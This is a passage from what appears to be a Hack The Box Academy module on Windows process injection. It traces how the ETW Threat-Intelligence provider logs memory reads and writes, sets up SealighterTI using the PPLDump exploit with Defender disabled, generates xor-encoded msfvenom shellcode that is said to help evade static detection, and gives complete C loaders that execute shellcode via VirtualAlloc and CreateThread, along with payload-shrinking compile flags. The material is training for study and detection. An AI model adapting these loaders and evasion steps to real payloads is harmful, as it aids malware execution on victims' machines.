![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-4.png)

The fourth parameter, `RegHandle`, is a pointer to a handle that receives the registration handle for the provider. If we press ' `x`' to open the cross-references to it, we can see which function calls it. All the functions calling this are most likely writing the event to the Microsoft-Windows-Threat-Intelligence provider.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-5.png)

Let's take the example of `EtwTiLogReadWriteVm`. If we double click and open it, we can see that it eventually calls the [EtwWrite](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-etwwrite) function.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-6.png)

The syntax of the `EtwWrite` function is as follows:

```c
NTSTATUS EtwWrite(
  [in]           REGHANDLE              RegHandle,
  [in]           PCEVENT_DESCRIPTOR     EventDescriptor,
  [in, optional] LPCGUID                ActivityId,
  [in]           ULONG                  UserDataCount,
  [in, optional] PEVENT_DATA_DESCRIPTOR UserData
);

```

The first parameter is the handle to the ETW provider registration, which is obtained from `EtwRegister`. The second parameter is a pointer to the `EventDescriptor`, which is a structure that describes the event being logged, containing tasks such as:

- `THREATINT_READVM_LOCAL`: Descriptor for local read VM events.
- `THREATINT_WRITEVM_LOCAL`: Descriptor for local write VM events.
- `THREATINT_READVM_REMOTE`: Descriptor for remote read VM events.
- `THREATINT_WRITEVM_REMOTE`: Descriptor for remote write VM events.

In this scenario, the second parameter for `EtwWrite` is `v13`. Let's find out what `v13` is:

```c
EtwWrite(v23, (PCEVENT_DESCRIPTOR)v13, 0i64, v20 + 1, &UserData)

```

The logic to determine the event descriptor ( `v13`) is simple. It checks if `a2` (source process) equals `a3` (destination process). If they are equal, it’s a local operation and sets `v13` to `THREATINT_READVM_LOCAL` and `v12` to `THREATINT_WRITEVM_LOCAL`. Otherwise, it’s a remote operation, and it sets `v12` to `THREATINT_WRITEVM_REMOTE` and `v13` to `THREATINT_READVM_REMOTE`.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-11.png)

If `a4` is not 16, it’s a write operation and sets `v13` to `v12`. If we go back to follow `a4`, we can see it is the fourth parameter to this function, and if we check previous function, the fourth parameter is `DesiredAccess`.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-12.png)

On checking this further, it looks like it is basically the value of `DesiredAccess` in decimal requested, from the functions `NtReadVirtualMemory` and `NtWriteVirtualMemory`. Both of these function calls are made eventually to `MiReadWriteVirtualMemory`.

16 in hex is `0x10`. So when `MiReadWriteVirtualMemory` is called with `0x10`, it means it is a `Read Operation`.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-13.png)

And when `MiReadWriteVirtualMemory` is called with `0x20`, it means it is a `WRITE` operation.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-14.png)

In this scenario:

- `a4 == 16` indicates a read operation.
- `a4 != 16` indicates a write operation.

The `EtwWrite` function further calls the [EtwWriteEx](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-etwwriteex) function to write the event.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-7.png)

The `EtwWriteEx` function takes care of writing events to the ETW system by performing various checks on the provider, event level, and keywords. It eventually uses the `EtwpEventWriteFull` function to perform the actual event writing, ensuring that events are written based on the configuration and status of the ETW provider.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-8.png)

If we examine which functions call `EtwTiLogReadWriteVm`, we find the function `MiReadWriteVirtualMemory`, which is called from `NtWriteVirtualMemory` and `NtReadVirtualMemory`. When these functions are called directly or even from their user-mode functions like `ReadProcessMemory` or `WriteProcessMemory`, the `THREATINT_READVM_LOCAL`, `THREATINT_WRITEVM_LOCAL`, `THREATINT_WRITEVM_REMOTE`, or `THREATINT_READVM_REMOTE` events will be logged. Similarly, this process logs events for other tasks as well.

## How to view events?

ETW-TI providers are exclusive to [Early Launch Antimalware (ELAM)](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/early-launch-antimalware) signed drivers, unlike the usual ETW providers. In order to capture the ETW-TI telemetry, we can use an open-source [project (Sealighter-TI)](https://github.com/pathtofile/SealighterTI) that can help in logging these events in the Windows Event Viewer.

The Sealighter-TI project uses [Sealighter](https://github.com/pathtofile/Sealighter) with unpatched exploits and [PPLDump](https://github.com/itm4n/PPLdump) to run the Microsoft-Windows-Threat-Intelligence ETW provider without the need for a signed driver or to putting the machine into 'test signing' mode. The PPLDump exploit is patched on Windows 10 v21H2 Build 19044.1826 and upwards. For the demonstration, this test is performed on Windows 10 v21H2 Build 19044.1288. Also, we make sure to disable Defender while running this tool.

To use pre-built binaries, download the `SealighterTI.exe` and `sealighter_provider.man` from the Releases page.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-9.png)

After downloading the files, we first move the `SealighterTI.exe` binary to a location accessible by all users, e.g., `C:\etw`. Then we open the `sealighter_provider.man` file in a text editor and replace all instances of `!!SEALIGHTER_LOCATION!!` with the full path to the `SealighterTI.exe` binary. After making the changes, the final XML should look like the example below:

```xml
<?xml version="1.0"?>
<instrumentationManifest xsi:schemaLocation="http://schemas.microsoft.com/win/2004/08/events eventman.xsd" xmlns="http://schemas.microsoft.com/win/2004/08/events" xmlns:win="http://manifests.microsoft.com/win/2004/08/windows/events" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:trace="http://schemas.microsoft.com/win/2004/08/events/trace">
	<instrumentation>
		<events>
			<provider name="Sealighter" guid="{CDD5F0CC-AB0C-4ABE-97B2-CC82B7E68F30}" symbol="SEALIGHTER_PROVIDER" resourceFileName="C:\tools\SealighterTI.exe" messageFileName="C:\tools\SealighterTI.exe">
				<events>
					<event symbol="SEALIGHTER_REPORT_EVENT" value="1" version="1" channel="Sealighter/Operational" level="win:Informational" task="Report" opcode="Report" template="SEALIGHTER_REPORT_TEMPLATE" keywords="Report " message="$(string.Sealighter.event.1.message)"></event>
				</events>
				<levels></levels>
				<tasks>
					<task name="Report" symbol="SEALIGHTER_REPORT_TASK" value="1" eventGUID="{F87D5C2B-E51E-466B-AC10-54D231220F98}" message="$(string.Sealighter.task.SEALIGHTER_REPORT_TASK.message)"></task>
				</tasks>
				<opcodes>
					<opcode name="Report" symbol="SEALIGHTER_REPORT_OPCODE" value="10" message="$(string.SEALIGHTER_PROVIDER.opcode.SEALIGHTER_REPORT_OPCODE.message)"></opcode>
				</opcodes>
				<channels>
					<channel name="Sealighter/Operational" chid="Sealighter/Operational" symbol="SEALIGHTER_OPERATIONAL" type="Operational" enabled="true" message="$(string.SEALIGHTER_PROVIDER.channel.SEALIGHTER_OPERATIONAL.message)"></channel>
				</channels>
				<keywords>
					<keyword name="Report" symbol="SEALIGHTER_REPORT_KEYWORD" mask="0x1" message="$(string.SEALIGHTER_PROVIDER.Keyword.SEALIGHTER_REPORT.message)"></keyword>
				</keywords>
				<templates>
					<template tid="SEALIGHTER_REPORT_TEMPLATE">
						<data name="json" inType="win:AnsiString" outType="win:Json"></data>
						<data name="activity_id" inType="win:AnsiString" outType="xs:string"></data>
						<data name="event_flags" inType="win:UInt16" outType="xs:unsignedShort"></data>
						<data name="event_id" inType="win:UInt16" outType="xs:unsignedShort"></data>
						<data name="event_name" inType="win:UnicodeString" outType="xs:string"></data>
						<data name="event_opcode" inType="win:UInt8" outType="xs:unsignedByte"></data>
						<data name="event_version" inType="win:UInt8" outType="xs:unsignedByte"></data>
						<data name="process_id" inType="win:UInt32" outType="xs:unsignedInt"></data>
						<data name="provider_name" inType="win:UnicodeString" outType="xs:string"></data>
						<data name="task_name" inType="win:UnicodeString" outType="xs:string"></data>
						<data name="thread_id" inType="win:UInt32" outType="xs:unsignedInt"></data>
						<data name="timestamp" inType="win:Int64" outType="xs:long"></data>
						<data name="trace_name" inType="win:AnsiString" outType="xs:string"></data>
					</template>
				</templates>
			</provider>
		</events>
	</instrumentation>
	<localization>
		<resources culture="en-US">
			<stringTable>
				<string id="level.Informational" value="Information"></string>
				<string id="Sealighter.task.SEALIGHTER_REPORT_TASK.message" value="Report on events"></string>
				<string id="Sealighter.task.SEALIGHTER_CONTROL_TASK.message" value="Control Sealighter"></string>
				<string id="Sealighter.opcode.a.message" value="a"></string>
				<string id="Sealighter.event.2.message" value="Control Event"></string>
				<string id="Sealighter.event.1.message" value="&#xA;%1"></string>
				<string id="SEALIGHTER_PROVIDER.opcode.SEALIGHTER_REPORT_OPCODE.message" value="Report on events"></string>
				<string id="SEALIGHTER_PROVIDER.opcode.SEALIGHTER_CONTROL_OPCODE.message" value="Control Sealighter"></string>
				<string id="SEALIGHTER_PROVIDER.channel.SEALIGHTER_OPERATIONAL.message" value="Operational"></string>
				<string id="SEALIGHTER_PROVIDER.Keyword.SEALIGHTER_REPORT.message" value="Report on events"></string>
				<string id="SEALIGHTER_PROVIDER.Keyword.SEALIGHTER_CONTROL.message" value="Control Sealighter"></string>
			</stringTable>
		</resources>
	</localization>
</instrumentationManifest>

```

Then, from an elevated command prompt, we use `wevtutil im` to install the manifest and initiate the event publisher:

```powershell
PS C:\tools> wevtutil im path/to/sealigher_provider.man

```

**Note:** This is already done on the target system. Sealighter-TI is ready to use.

Then, we simply run the `SealighterTI.exe` binary. For the first run, it is recommended use the debug flag ( `-d`):

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/sealighter-debug.png)

Now, we can see the events in the Event Viewer. If we perform any suspicious activity, it should be logged.

![ETW_TI](https://academy.hackthebox.com/storage/modules/266/etwti_image-15.png)

**Note:** These events are already enabled on the target (VM). There is no need to run this executable separately.


# Compiling Shellcode and DLL

**Note:** This is an informative section to demonstrate how to generate shellcode and DLL files. The tools and samples used in this module are stored on the target system and the shortcut files are created on the desktop. However, it is good to practice this in the target (VM) to get more comprehensive grasp of the topics presented. Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials.

Before we start exploring more process injection techniques, let's create a sample shellcode and DLL to be used throughout the module.

## Shellcode for injection

Shellcode is a small piece of position-independent, executable machine code that is injected into a process to achieve code execution. In process injection, shellcode is often used to execute arbitrary commands, spawn a reverse shell, or escalate privileges within the target process. It is designed to be small and self-contained. To create a sample message box shellcode, we can use [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html), a Metasploit tool for creating payloads.

In the pwnbox, we can use the following command `msfvenom` command to generate shellcode that will execute the calculator ( `calc.exe`):

```shell
msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.exe -e x64/xor -f c -v shellcode

```

The breakdown of the command is as follows:

- `--platform windows`: Specifies that the shellcode is for the Windows platform.
- `--arch x64`: Specifies the architecture of the shellcode to be 64-bit.
- `-p windows/x64/exec`: Indicates the payload type, in this case, the exec payload for Windows x64, which executes a given command.
- `CMD=calc.exe`: Specifies the command to execute, which is `calc.exe` (the Windows calculator).
- `-e x64/xor`: Specifies that the payload should be encoded using the x64/xor encoder to enhance its chances of evading static detection mechanisms while maintaining its functionality.
- `-f c`: Formats the output as a C-style array.
- `-v shellcode`: Sets the variable name for the shellcode array to shellcode.

When we run this command, msfvenom will generate the shellcode and display it in the specified format. The shellcode below pops up `calc.exe` when executed. The shellcode is converted into a char array and saved inside `shellcode[]`. The output will look something like this:

```shell
msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.exe -e x64/xor -f c -v shellcode

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 319 (iteration=0)
x64/xor chosen with final size 319
Payload size: 319 bytes
Final size of c file: 1375 bytes

unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x26\x8f\x41\x8a\x78\x3a\x54\xf2\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xda\xc7\xc2"
"\x6e\x88\xd2\x94\xf2\x26\x8f\x00\xdb\x39\x6a\x06\xa3\x70"
"\xc7\x70\x58\x1d\x72\xdf\xa0\x46\xc7\xca\xd8\x60\x72\xdf"
"\xa0\x06\xc7\xca\xf8\x28\x72\x5b\x45\x6c\xc5\x0c\xbb\xb1"
"\x72\x65\x32\x8a\xb3\x20\xf6\x7a\x16\x74\xb3\xe7\x46\x4c"
"\xcb\x79\xfb\xb6\x1f\x74\xce\x10\xc2\xf3\x68\x74\x79\x64"
"\xb3\x09\x8b\xa8\xb1\xd4\x7a\x26\x8f\x41\xc2\xfd\xfa\x20"
"\x95\x6e\x8e\x91\xda\xf3\x72\x4c\xb6\xad\xcf\x61\xc3\x79"
"\xea\xb7\xa4\x6e\x70\x88\xcb\xf3\x0e\xdc\xba\x27\x59\x0c"
"\xbb\xb1\x72\x65\x32\x8a\xce\x80\x43\x75\x7b\x55\x33\x1e"
"\x6f\x34\x7b\x34\x39\x18\xd6\x2e\xca\x78\x5b\x0d\xe2\x0c"
"\xb6\xad\xcf\x65\xc3\x79\xea\x32\xb3\xad\x83\x09\xce\xf3"
"\x7a\x48\xbb\x27\x5f\x00\x01\x7c\xb2\x1c\xf3\xf6\xce\x19"
"\xcb\x20\x64\x0d\xa8\x67\xd7\x00\xd3\x39\x60\x1c\x71\xca"
"\xaf\x00\xd8\x87\xda\x0c\xb3\x7f\xd5\x09\x01\x6a\xd3\x03"
"\x0d\xd9\x70\x1c\xc2\xc2\x3b\x54\xf2\x26\x8f\x41\x8a\x78"
"\x72\xd9\x7f\x27\x8e\x41\x8a\x39\x80\x65\x79\x49\x08\xbe"
"\x5f\xc3\xca\xe1\x50\x70\xce\xfb\x2c\xed\x87\xc9\x0d\xf3"
"\xc7\xc2\x4e\x50\x06\x52\x8e\x2c\x0f\xba\x6a\x0d\x3f\xef"
"\xb5\x35\xfd\x2e\xe0\x78\x63\x15\x7b\xfc\x70\x94\xe9\x19"
"\x56\x37\xdc\x43\xf7\x24\x8a\x78\x3a\x54\xf2";

```

This shellcode array can be added to our C programs as an array of bytes that holds shellcode (i.e. `unsigned char shellcode[]`) for testing shellcode injection techniques. Then, we create a pointer to any type ( [LPVOID](https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#LPVOID)) ( `lpAlloc`) to allocate the memory equal to the size of the shellcode buffer with executable permissions, such as [PAGE\_EXECUTE\_READWRITE](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants#PAGE_EXECUTE_READWRITE) using the [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function:

```c
LPVOID lpAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

```

Then, the shellcode is copied from the buffer to the allocated memory region using the [RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory) function:

```c
RtlMoveMemory(lpAlloc, shellcode, sizeof(shellcode));

```

After this call, a new thread is created in the process using the [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) function, and it begins executing the shellcode located at the address specified by `lpAlloc`. The main thread can continue execution independently of the new thread.

```c
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, NULL);

```

Here, the `(LPTHREAD_START_ROUTINE)lpAlloc` parameter is a pointer to the starting address of the thread. In this case, `lpAlloc` is the address of the allocated memory, which contains the shellcode to be executed. By casting it to `LPTHREAD_START_ROUTINE`, the pointer is converted to the appropriate type for the function. When the thread is started, it will execute the `calc.exe`, and a calculator window will pop up.

The complete code for the sample program to perform shellcode injection is as follows:

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x26\x8f\x41\x8a\x78\x3a\x54\xf2\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xda\xc7\xc2"
"\x6e\x88\xd2\x94\xf2\x26\x8f\x00\xdb\x39\x6a\x06\xa3\x70"
"\xc7\x70\x58\x1d\x72\xdf\xa0\x46\xc7\xca\xd8\x60\x72\xdf"
"\xa0\x06\xc7\xca\xf8\x28\x72\x5b\x45\x6c\xc5\x0c\xbb\xb1"
"\x72\x65\x32\x8a\xb3\x20\xf6\x7a\x16\x74\xb3\xe7\x46\x4c"
"\xcb\x79\xfb\xb6\x1f\x74\xce\x10\xc2\xf3\x68\x74\x79\x64"
"\xb3\x09\x8b\xa8\xb1\xd4\x7a\x26\x8f\x41\xc2\xfd\xfa\x20"
"\x95\x6e\x8e\x91\xda\xf3\x72\x4c\xb6\xad\xcf\x61\xc3\x79"
"\xea\xb7\xa4\x6e\x70\x88\xcb\xf3\x0e\xdc\xba\x27\x59\x0c"
"\xbb\xb1\x72\x65\x32\x8a\xce\x80\x43\x75\x7b\x55\x33\x1e"
"\x6f\x34\x7b\x34\x39\x18\xd6\x2e\xca\x78\x5b\x0d\xe2\x0c"
"\xb6\xad\xcf\x65\xc3\x79\xea\x32\xb3\xad\x83\x09\xce\xf3"
"\x7a\x48\xbb\x27\x5f\x00\x01\x7c\xb2\x1c\xf3\xf6\xce\x19"
"\xcb\x20\x64\x0d\xa8\x67\xd7\x00\xd3\x39\x60\x1c\x71\xca"
"\xaf\x00\xd8\x87\xda\x0c\xb3\x7f\xd5\x09\x01\x6a\xd3\x03"
"\x0d\xd9\x70\x1c\xc2\xc2\x3b\x54\xf2\x26\x8f\x41\x8a\x78"
"\x72\xd9\x7f\x27\x8e\x41\x8a\x39\x80\x65\x79\x49\x08\xbe"
"\x5f\xc3\xca\xe1\x50\x70\xce\xfb\x2c\xed\x87\xc9\x0d\xf3"
"\xc7\xc2\x4e\x50\x06\x52\x8e\x2c\x0f\xba\x6a\x0d\x3f\xef"
"\xb5\x35\xfd\x2e\xe0\x78\x63\x15\x7b\xfc\x70\x94\xe9\x19"
"\x56\x37\xdc\x43\xf7\x24\x8a\x78\x3a\x54\xf2";

int main() {
    DWORD pid = GetCurrentProcessId();
    printf("\n[+] Current process ID: %lu\n", pid);

    LPVOID lpAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("\n[+] Allocated memory locally in address : 0x%p\n", lpAlloc);

    if(!RtlMoveMemory(lpAlloc, shellcode, sizeof(shellcode))) {
        printf("[!] Shellcode not copied\n");
        return 1;
    }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

```

We can compile this code using the following command:

```shell
x86_64-w64-mingw32-gcc shellcode-injection.c -o shellcode-injection.exe -m64

```

Compiling normally will produce a file of approximately 247.6 KB. This is quite a large file. Let's see how we can reduce the payload size.

### Payload size reduction

Reducing the size of an executable is an important task, especially when dealing with shellcode and payloads in the context of security research or exploits. There are several methods and compiler options to reduce the size of our executable when using `x86_64-w64-mingw32-gcc`:

- `Strip Debug Information and Symbols`:
The `-s` option strips the executable, removing all symbol table and relocation information.
Alternatively, the `strip` command can be used post-compilation for further stripping.
- `Optimization for Size`:
The `-Os` optimization flag optimizes for size, enabling all `-O2` optimizations except those that increase the size of the binary.
- `Remove Unused Sections`:
The `-Wl,--gc-sections` flag tells the linker to remove unused sections.
- `Disable Exceptions`:
The `-fno-exceptions` flag disables C++ exception handling, reducing the binary size.
- `Reduce Standard Library Usage`:
Minimize the use of standard library functions where possible.
Use `-nostdlib` or `-nodefaultlibs` if you are not using any standard library functions.
- `Inline Functions`:
Use `-finline-functions` to inline functions, which can reduce function call overhead.
- `Minimize Stack Usage`:
Use `-fno-stack-protector` to disable stack protection, which can reduce the binary size.
- `Linker Scripts`:
Custom linker scripts can further reduce size by controlling the sections and symbols included in the binary.

The final command after adding few more flags to remove more unnecessary information and reduce the size is as follows:

```shell
x86_64-w64-mingw32-gcc shellcode-injection.c -o shellcode-injection.exe -m64 -s -O2 -Os -Wno-write-strings -fno-exceptions -Wl,--gc-sections -Wno-missing-braces

```

In the above command, the flags used for reducing the executable size are explained as follows:

- `O2`: This option enables level 2 optimization, which applies a moderate level of optimization to the code to improve performance.
- `Os`: This option enables optimization for size, which tries to reduce the size of the generated code at the expense of some performance.
- `Wno-write-strings`: This option suppresses warnings related to writing to read-only memory (such as string literals). It's generally safe to ignore these warnings for string literals.
- `fno-exceptions`: This option disables support for C++ exceptions. If you're not using C++ exceptions in your code, this can reduce the size of the generated binary.
- `-Wl,--gc-sections`: This option passes the --gc-sections flag to the linker, which tells the linker to remove unused sections from the final executable. This can further reduce the size of the executable.
- `Wno-missing-braces`: This option suppresses warnings about missing braces in initializers. It's generally safe to ignore these warnings, but you should ensure that your initializers are correct.

Let's compile the program using the flags mentioned below, and see the difference.

```shell
x86_64-w64-mingw32-gcc shellcode-injection.c -o shellcode-injection.exe -m64 -s -O2 -Os -Wno-write-strings -fno-exceptions -Wl,--gc-sections -Wno-missing-braces

```

After compiling with these flags, we can see that the size is significantly reduced (i.e., from `247.6 KB` to `38.9 KB` in this case). The GCC documentation contains detailed information about the flags that can be passed to the `x86_64-w64-mingw32-gcc` compiler.

References:

- [https://gcc.gnu.org/onlinedocs/gcc/Option-Index.html](https://gcc.gnu.org/onlinedocs/gcc/Option-Index.html)
- [https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html#index-fmerge-all-constants](https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html#index-fmerge-all-constants)

Once we execute this shellcode in a program, `calc.exe` pops up, as shown in the video below:

![Shellcode](https://academy.hackthebox.com/storage/modules/266/shellcode-compile.gif)

## Dynamic Link Library (DLL) for Injection

We can also inject a DLL as a payload into the current or remote process. A DLL is injected using a [LoadLibrary()](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function in windows. Let us understand how to compile a DLL file.

The code below shows a simple DLL that pops up a message box upon successful loading of the DLL.

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "Injection Successful", "HTB Lab", MB_OK);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

```

This code can be compiled in Visual Studio or using MinGW-w64, which is a type of GCC compiler for Windows systems. After compilation, the file size is approximately `86.1 kB`.

```shell
x86_64-w64-mingw32-gcc -shared -o htbdll.dll htbdll.c -m64

```

The flags used are explained as follows:

`-m64`: This option specifies that the compiler should generate code for a 64-bit target architecture (x86-64).

`-shared`: Used for creating a DLL file.

`-o`: Used for specifying the output file name.

Notice the file size of the DLL; it is quite large. We can reduce it using the `-s` option (and other flags as explained above). This option instructs the linker to strip all symbol information from the executable, which helps reduce its size up to approximately `12.8 kB`.

```shell
x86_64-w64-mingw32-gcc -shared -o htbdll.dll htbdll.c -m64 -s

```

This can also be compiled in the Windows target (VM).

![Size](https://academy.hackthebox.com/storage/modules/266/dll-compile.gif)

The DLL is ready now, we'll use it in the later sections.


# Self Injection (Local Process Injection)

Self injection (or local process injection) is a technique used by malware to `inject code into the same process` and execute it. It usually involves creating a new thread to run the code `without creating a new process`. The injected code can then perform various actions within the same process. The diagram below shows the different steps involved in a local process injection, where the shellcode is copied, and a new thread is created to execute the shellcode.

![Local Process Injection](https://academy.hackthebox.com/storage/modules/266/image17_.png)

The process first reserves memory space within its own address space using APIs like `VirtualAlloc()` or `NtAllocateVirtualMemory()`. Then, the malicious code, such as shellcode or a reflective DLL, is written into the allocated memory using functions like `memcpy()`, `WriteProcessMemory()`, `RtlCopyMemory()`, or `RtlMoveMemory()`. If the memory region doesn't have the permissions to execute the code, then the permissions are also modified using functions like `VirtualProtect()` or `NtProtectVirtualMemory()`, ensuring the injected code can run. Finally, the process executes the injected code through direct function calls, thread creation ( `CreateThread()`, `RtlCreateUserThread()`, `NtCreateThreadEx()`), or execution redirection techniques like `SetThreadContext()` and `QueueUserAPC()`. We will learn these techniques in later sections. For now, we'll understand a scenario of shellcode injection into the local process without accessing or creating a remote or new process.

## Source Code for Demo

To demonstrate local process injection, we have created a C program that performs a local process injection. Once the shellcode is written to the allocated memory region, a messagebox is displayed.

```c
#include <windows.h>
#include <stdio.h>

//Shellcode to show HelloWorld Message Box
unsigned char shellcode[] =
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
    "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
    "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
    "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
    "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
    "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
    "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
    "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
    "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
    "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
    "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
    "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
    "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
    "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
    "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
    "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
    "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
    "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
    "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
    "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
    "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
    "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
    "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
    "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
    "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
    "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

int main() {
    DWORD pid = GetCurrentProcessId();
    printf("\n[+] Current process ID: %lu\n", pid);

    LPVOID lpAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpAlloc == NULL) {
        printf("VirtualAlloc failed\n");
        return 1;
    } else {
        printf("\n[+] Allocated memory locally in address : 0x%p\n", lpAlloc);
    }

    printf("Press any key to copy shellcode . . .\n");

    getchar();

    if(!RtlMoveMemory(lpAlloc, shellcode, sizeof(shellcode))) {
        printf("Shellcode copied\n");
        return 1;
    }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, NULL);

    if (hThread == NULL) {
        printf("CreateThread failed\n");
        return 1;
    }

    DWORD tid = GetThreadId(hThread);
    printf("[!] Local thread created with TID: %lu\n", tid);
    printf("[!] Local thread start address: 0x%p\n", lpAlloc);
    printf("[+] Shellcode injected successfully.\n");

    WaitForSingleObject(hThread, INFINITE);

    return 0;
}

```

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the samples and tools at the following paths:

- **x64dbg**: `C:\injection\tools\x64dbg\release\x64\x64dbg.exe`
- **ProcessHacker**: `C:\injection\tools\ProcessHacker\ProcessHacker.exe`
- **Moneta**: `C:\injection\tools\Moneta64.exe`
- **PE Sieve**: `C:\injection\tools\pe-sieve64.exe`
- **Local Injection**: `C:\injection\local\local_shellcode_inj.exe`

* * *

## Compilation of Code

We can compile this code using the command mentioned below:

```cmd-session
C:\> x86_64-w64-mingw32-gcc C:\injection\source_code\local_shellcode_inj.c -o C:\injection\source_code\local_shellcode_inj.exe -m64

```

Compiling normally will produce a file of size around 280 KB. Let's add few more flags to remove more unnecessary information and reduce the size. Below is the final command after adding few more flags to remove more unnecessary information and reduce the size:

```cmd-session
